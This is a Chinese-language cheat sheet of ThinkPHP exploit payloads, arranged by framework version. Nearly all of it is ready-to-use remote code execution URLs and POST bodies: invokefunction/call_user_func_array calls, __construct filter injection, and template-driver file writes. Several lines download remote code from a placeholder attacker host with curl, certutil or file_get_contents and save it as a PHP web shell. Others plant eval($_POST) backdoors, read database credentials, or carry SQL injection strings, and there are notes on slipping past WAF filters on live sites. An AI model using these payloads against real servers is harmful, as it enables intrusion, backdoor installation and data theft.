# ThinkPHP专区



## 经典RCE

```
http://xxx.xxx.xxx.xx:xx/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

http://xxx.xx.x.x:xxx/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat${IFS}/flag
```



轻量级、国产PHP开发框架，遵循Apache 2开源协议



正式版需要PHP5.0以上版本



## 漏洞学习





### ThinkPHP 2.x/3.0 GetShell

文件/ThinkPHP/Lib/Think?Util/Dispatcher.class.php

中使用preg_replace的/e模式匹配路由，/e可以导致代码执行



```
index.php?s=a/b/c/${code}
index.php?s=a/b/c/${code}/d/e/f
index.php?s=a/b/c/d/e/${code}
```



```
s=a/b/c/$%7Bsystem(cmd)%7D
```





### ThinkPHP 5.0 GetShell

本次ThinkPHP 5.0的安全更新主要是在library/think/APP.php文件中增加了对控制器名的限制

```
http://192.168.1.21:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo
```



GET

```
s=index/think\app/invokefuncion&function=call_user_func_array&vars[0]=assert&vars[1][]=cmd
```



POST

```
_method=_construct&filter[]=system&method=get&server[REQUEST_METHOD]=cmd
```





### ThinkPHP 5.1 GetShell

GET

```
s=index/think\app/invokefuncion&function=call_user_func_array&vars[0]=assert&vars[1][]=cmd
```



POST

```
a=system&b=cmd&_method=filter
```







## Payload库



### ThinkPHP 5.0.5

```
waf对eval进行了拦截
禁止了assert函数
对eval函数后面的括号进行了正则过滤
对file_get_contents函数后面的括号进行了正则过滤

http://www.xxxx.com/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]=<?php /*1111*//***/file_put_contents/*1**/(/***/'index11.php'/**/,file_get_contents(/**/'https://www.hack.com/xxx.js'))/**/;/**/?>
```



### ThinkPHP 5.0.10

```
(post)public/index.php?s=index/index/index
(data)s=whoami&_method=__construct&method&filter[]=system
```

### ThinkPHP 5.0.11

```
http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php
```

### ThinkPHP 5.0.14

```
eval（''）和assert（''）被拦截，命令函数被禁止
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();
http://www.xxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array("file_put_contents",array("3.php",file_get_contents("https://www.hack.com/xxx.js")));
 
php7.2
http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1
http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index111.php',file_get_contents('https://www.hack.com/xxx.js'));?>写进去发现转义了尖括号
通过copy函数
http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.php
```

### ThinkPHP 5.0.18

```
windows
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo()
 
使用certutil
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php
 
由于根目录没写权限，所以写到uploads
```

### ThinkPHP 5.0.21

```
http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 
http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

### ThinkPHP 5.0.22

```
http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username
http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password
http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

### ThinkPHP 5.0.23

```
(post)public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al
Debug模式
(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx
```

### ThinkPHP 5.1.18

```
http://www.xxxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index_bak2.php',file_get_contents('https://www.hack.com/xxx.js'));?>
 
所有目录都无写权限,base64函数被拦截
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1])
```

### ThinkPHP 5.1.*

```
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd
http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd
http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd
```

### ThinkPHP 5.1.*和5.2.\*

```
 (post)public/index.php (data)c=exec&f=calc.exe&_method=filter 
```

### ThinkPHP 版本未知

```
?s=index/\think\module/action/param1/${@phpinfo()}
?s=index/\think\Module/Action/Param/${@phpinfo()}
?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}
index.php?s=/home/article/view_recent/name/1'
header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"
index.php?s=/home/shopcart/getPricetotal/tag/1%27
index.php?s=/home/shopcart/getpriceNum/id/1%27 index.php?s=/home/user/cut/id/1%27 index.php?s=/home/service/index/id/1%27 index.php?s=/home/pay/chongzhi/orderid/1%27 index.php?s=/home/pay/index/orderid/1%27 index.php?s=/home/order/complete/id/1%27 index.php?s=/home/order/complete/id/1%27 index.php?s=/home/order/detail/id/1%27 index.php?s=/home/order/cancel/id/1%27 index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+ POST /index.php?s=/home/user/checkcode/ HTTP/1.1 Content-Disposition: form-data; name="couponid"1') union select sleep('''+str(sleep_time)+''')#
```

### PHP7以上无法使用Assert

```
 
_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=包含&x=phpinfo();
有上传图片或者日志用这个包含就可以
```



